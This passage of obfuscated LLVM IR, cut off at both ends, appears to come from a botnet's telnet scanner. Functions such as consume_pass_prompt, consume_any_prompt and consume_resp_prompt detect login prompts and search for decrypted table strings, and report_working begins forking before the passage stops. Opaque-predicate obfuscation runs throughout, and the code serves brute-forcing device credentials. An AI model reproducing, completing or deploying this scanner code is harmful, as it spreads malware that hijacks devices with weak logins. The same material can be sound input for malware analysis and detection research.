  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %185

; <label>:185:                                    ; preds = %originalBBpart227, %154
  %186 = load i32, i32* @x.67
  %187 = load i32, i32* @y.68
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %185
  %194 = load i32, i32* @x.67
  %195 = load i32, i32* @y.68
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %202

; <label>:202:                                    ; preds = %originalBBpart231, %originalBBpart223
  br label %203

; <label>:203:                                    ; preds = %202, %118
  %204 = load i32, i32* @x.67
  %205 = load i32, i32* @y.68
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %203
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %212 = load i32, i32* %6, align 4
  %213 = icmp eq i32 %212, -1
  %214 = load i32, i32* @x.67
  %215 = load i32, i32* @y.68
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %213, label %222, label %223

; <label>:222:                                    ; preds = %originalBBpart235
  store i32 0, i32* %2, align 4
  br label %225

; <label>:223:                                    ; preds = %originalBBpart235
  %224 = load i32, i32* %6, align 4
  store i32 %224, i32* %2, align 4
  br label %225

; <label>:225:                                    ; preds = %223, %222
  %226 = load i32, i32* %2, align 4
  ret i32 %226

originalBBalteredBB:                              ; preds = %originalBB, %18
  %227 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %228 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %227, i32 0, i32 7
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds [256 x i8], [256 x i8]* %228, i64 0, i64 %230
  %232 = load i8, i8* %231, align 1
  %233 = sext i8 %232 to i32
  %234 = icmp eq i32 %233, 58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %235 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %235, i32 0, i32 7
  %237 = load i32, i32* %5, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [256 x i8], [256 x i8]* %236, i64 0, i64 %238
  %240 = load i8, i8* %239, align 1
  %241 = sext i8 %240 to i32
  %242 = icmp eq i32 %241, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %243 = load i32, i32* %5, align 4
  %_ = shl i32 %243, 1
  %_7 = sub i32 %243, 1
  %gen = mul i32 %_7, 1
  %_8 = sub i32 %243, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %243, 1
  %_11 = sub i32 %243, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %243, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %243, 1
  %_16 = sub i32 %243, 1
  %gen17 = mul i32 %_16, 1
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %6, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %136
  %245 = load i32, i32* %7, align 4
  store i32 %245, i32* %6, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %167
  %246 = load i32, i32* %7, align 4
  store i32 %246, i32* %6, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %185
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %203
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %247 = load i32, i32* %6, align 4
  %248 = icmp eq i32 %247, -1
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %73, %1
  %15 = load i32, i32* @x.69
  %16 = load i32, i32* @y.70
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* %5, align 4
  %24 = icmp sgt i32 %23, 0
  %25 = load i32, i32* @x.69
  %26 = load i32, i32* @y.70
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %76

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 7
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [256 x i8], [256 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp eq i32 %40, 58
  br i1 %41, label %69, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %44 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %43, i32 0, i32 7
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [256 x i8], [256 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 62
  br i1 %50, label %69, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 7
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [256 x i8], [256 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp eq i32 %58, 36
  br i1 %59, label %69, label %60

; <label>:60:                                     ; preds = %51
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 7
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [256 x i8], [256 x i8]* %62, i64 0, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp eq i32 %67, 35
  br i1 %68, label %69, label %72

; <label>:69:                                     ; preds = %60, %51, %42, %33
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %6, align 4
  br label %76

; <label>:72:                                     ; preds = %60
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %5, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %5, align 4
  br label %14

; <label>:76:                                     ; preds = %69, %originalBBpart2
  %77 = load i32, i32* @x.69
  %78 = load i32, i32* @y.70
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %76
  %85 = load i32, i32* %6, align 4
  %86 = icmp eq i32 %85, -1
  %87 = load i32, i32* @x.69
  %88 = load i32, i32* @y.70
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %86, label %95, label %128

; <label>:95:                                     ; preds = %originalBBpart24
  call void @table_unlock_val(i8 zeroext 25)
  %96 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %96, i8** %7, align 8
  %97 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %98 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %97, i32 0, i32 7
  %99 = getelementptr inbounds [256 x i8], [256 x i8]* %98, i32 0, i32 0
  %100 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %101 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %100, i32 0, i32 6
  %102 = load i32, i32* %101, align 4
  %103 = load i8*, i8** %7, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sub nsw i32 %104, 1
  %106 = call i32 @util_memsearch(i8* %99, i32 %102, i8* %103, i32 %105)
  %107 = icmp ne i32 %106, -1
  %108 = zext i1 %107 to i32
  store i32 %108, i32* %8, align 4
  br i1 %107, label %109, label %111

; <label>:109:                                    ; preds = %95
  %110 = load i32, i32* %8, align 4
  store i32 %110, i32* %6, align 4
  br label %111

; <label>:111:                                    ; preds = %109, %95
  %112 = load i32, i32* @x.69
  %113 = load i32, i32* @y.70
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  %120 = load i32, i32* @x.69
  %121 = load i32, i32* @y.70
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %128

; <label>:128:                                    ; preds = %originalBBpart28, %originalBBpart24
  call void @table_lock_val(i8 zeroext 25)
  %129 = load i32, i32* %6, align 4
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %131, label %132

; <label>:131:                                    ; preds = %128
  store i32 0, i32* %2, align 4
  br label %134

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* %6, align 4
  store i32 %133, i32* %2, align 4
  br label %134

; <label>:134:                                    ; preds = %132, %131
  %135 = load i32, i32* %2, align 4
  ret i32 %135

originalBBalteredBB:                              ; preds = %originalBB, %14
  %136 = load i32, i32* %5, align 4
  %137 = icmp sgt i32 %136, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %76
  %138 = load i32, i32* %6, align 4
  %139 = icmp eq i32 %138, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.71
  %3 = load i32, i32* @y.72
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 6
  %17 = load i32, i32* %16, align 4
  %18 = sub nsw i32 %17, 1
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @x.71
  %20 = load i32, i32* @y.72
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %originalBBpart238, %originalBBpart2
  %28 = load i32, i32* %13, align 4
  %29 = icmp sgt i32 %28, 0
  br i1 %29, label %30, label %130

; <label>:30:                                     ; preds = %27
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %13, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 58
  br i1 %38, label %91, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %13, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 62
  br i1 %47, label %91, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 36
  br i1 %56, label %91, label %57

; <label>:57:                                     ; preds = %48
  %58 = load i32, i32* @x.71
  %59 = load i32, i32* @y.72
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %57
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 7
  %68 = load i32, i32* %13, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [256 x i8], [256 x i8]* %67, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 35
  %74 = load i32, i32* @x.71
  %75 = load i32, i32* @y.72
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %73, label %91, label %82

; <label>:82:                                     ; preds = %originalBBpart216
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 7
  %85 = load i32, i32* %13, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [256 x i8], [256 x i8]* %84, i64 0, i64 %86
  %88 = load i8, i8* %87, align 1
  %89 = sext i8 %88 to i32
  %90 = icmp eq i32 %89, 37
  br i1 %90, label %91, label %110

; <label>:91:                                     ; preds = %82, %originalBBpart216, %48, %39, %30
  %92 = load i32, i32* @x.71
  %93 = load i32, i32* @y.72
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %91
  %100 = load i32, i32* %13, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %14, align 4
  %102 = load i32, i32* @x.71
  %103 = load i32, i32* @y.72
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %130

; <label>:110:                                    ; preds = %82
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* @x.71
  %113 = load i32, i32* @y.72
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %111
  %120 = load i32, i32* %13, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %13, align 4
  %122 = load i32, i32* @x.71
  %123 = load i32, i32* @y.72
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart238, label %originalBB29alteredBB

originalBBpart238:                                ; preds = %originalBB29
  br label %27

; <label>:130:                                    ; preds = %originalBBpart227, %27
  %131 = load i32, i32* %14, align 4
  %132 = icmp eq i32 %131, -1
  br i1 %132, label %133, label %134

; <label>:133:                                    ; preds = %130
  store i32 0, i32* %10, align 4
  br label %136

; <label>:134:                                    ; preds = %130
  %135 = load i32, i32* %14, align 4
  store i32 %135, i32* %10, align 4
  br label %136

; <label>:136:                                    ; preds = %134, %133
  %137 = load i32, i32* %10, align 4
  ret i32 %137

originalBBalteredBB:                              ; preds = %originalBB, %1
  %138 = alloca i32, align 4
  %139 = alloca %struct.scanner_connection*, align 8
  %140 = alloca i8*, align 8
  %141 = alloca i32, align 4
  %142 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %139, align 8
  store i32 -1, i32* %142, align 4
  %143 = load %struct.scanner_connection*, %struct.scanner_connection** %139, align 8
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %143, i32 0, i32 6
  %145 = load i32, i32* %144, align 4
  %_ = shl i32 %145, 1
  %_1 = shl i32 %145, 1
  %_2 = sub i32 0, %145
  %gen = add i32 %_2, 1
  %_3 = shl i32 %145, 1
  %_4 = sub i32 0, %145
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %145
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 %145, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %145
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 0, %145
  %gen13 = add i32 %_12, 1
  %146 = sub nsw i32 %145, 1
  store i32 %146, i32* %141, align 4
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %57
  %147 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %148 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %147, i32 0, i32 7
  %149 = load i32, i32* %13, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [256 x i8], [256 x i8]* %148, i64 0, i64 %150
  %152 = load i8, i8* %151, align 1
  %153 = sext i8 %152 to i32
  %154 = icmp eq i32 %153, 35
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %91
  %155 = load i32, i32* %13, align 4
  %_19 = shl i32 %155, 1
  %_20 = sub i32 0, %155
  %gen21 = add i32 %_20, 1
  %_22 = shl i32 %155, 1
  %_23 = sub i32 0, %155
  %gen24 = add i32 %_23, 1
  %_25 = shl i32 %155, 1
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %111
  %157 = load i32, i32* %13, align 4
  %_30 = shl i32 %157, -1
  %_31 = sub i32 %157, -1
  %gen32 = mul i32 %_31, -1
  %_33 = sub i32 0, %157
  %gen34 = add i32 %_33, -1
  %_35 = sub i32 0, %157
  %gen36 = add i32 %_35, -1
  %158 = add nsw i32 %157, -1
  store i32 %158, i32* %13, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.73
  %3 = load i32, i32* @y.74
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %15 = call i8* @table_retrieve_val(i32 10, i32* %14)
  store i8* %15, i8** %12, align 8
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 6
  %21 = load i32, i32* %20, align 4
  %22 = load i8*, i8** %12, align 8
  %23 = load i32, i32* %14, align 4
  %24 = sub nsw i32 %23, 1
  %25 = call i32 @util_memsearch(i8* %18, i32 %21, i8* %22, i32 %24)
  %26 = icmp ne i32 %25, -1
  %27 = load i32, i32* @x.73
  %28 = load i32, i32* @y.74
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %10, align 4
  br label %85

; <label>:36:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %37 = call i8* @table_retrieve_val(i32 9, i32* %14)
  store i8* %37, i8** %12, align 8
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i32 0, i32 0
  %41 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %41, i32 0, i32 6
  %43 = load i32, i32* %42, align 4
  %44 = load i8*, i8** %12, align 8
  %45 = load i32, i32* %14, align 4
  %46 = sub nsw i32 %45, 1
  %47 = call i32 @util_memsearch(i8* %40, i32 %43, i8* %44, i32 %46)
  store i32 %47, i32* %13, align 4
  call void @table_lock_val(i8 zeroext 9)
  %48 = load i32, i32* %13, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %67

; <label>:50:                                     ; preds = %36
  %51 = load i32, i32* @x.73
  %52 = load i32, i32* @y.74
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %50
  store i32 0, i32* %10, align 4
  %59 = load i32, i32* @x.73
  %60 = load i32, i32* @y.74
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %85

; <label>:67:                                     ; preds = %36
  %68 = load i32, i32* @x.73
  %69 = load i32, i32* @y.74
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %67
  %76 = load i32, i32* %13, align 4
  store i32 %76, i32* %10, align 4
  %77 = load i32, i32* @x.73
  %78 = load i32, i32* @y.74
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %85

; <label>:85:                                     ; preds = %originalBBpart213, %originalBBpart29, %35
  %86 = load i32, i32* %10, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %1
  %87 = alloca i32, align 4
  %88 = alloca %struct.scanner_connection*, align 8
  %89 = alloca i8*, align 8
  %90 = alloca i32, align 4
  %91 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %88, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %92 = call i8* @table_retrieve_val(i32 10, i32* %91)
  store i8* %92, i8** %89, align 8
  %93 = load %struct.scanner_connection*, %struct.scanner_connection** %88, align 8
  %94 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %93, i32 0, i32 7
  %95 = getelementptr inbounds [256 x i8], [256 x i8]* %94, i32 0, i32 0
  %96 = load %struct.scanner_connection*, %struct.scanner_connection** %88, align 8
  %97 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %96, i32 0, i32 6
  %98 = load i32, i32* %97, align 4
  %99 = load i8*, i8** %89, align 8
  %100 = load i32, i32* %91, align 4
  %_ = sub i32 0, %100
  %gen = add i32 %_, 1
  %_1 = sub i32 %100, 1
  %gen2 = mul i32 %_1, 1
  %_3 = shl i32 %100, 1
  %_4 = shl i32 %100, 1
  %_5 = sub i32 %100, 1
  %gen6 = mul i32 %_5, 1
  %101 = sub nsw i32 %100, 1
  %102 = call i32 @util_memsearch(i8* %95, i32 %98, i8* %99, i32 %101)
  %103 = icmp ne i32 %102, -1
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %50
  store i32 0, i32* %10, align 4
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %67
  %104 = load i32, i32* %13, align 4
  store i32 %104, i32* %10, align 4
  br label %originalBB11
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  br label %111

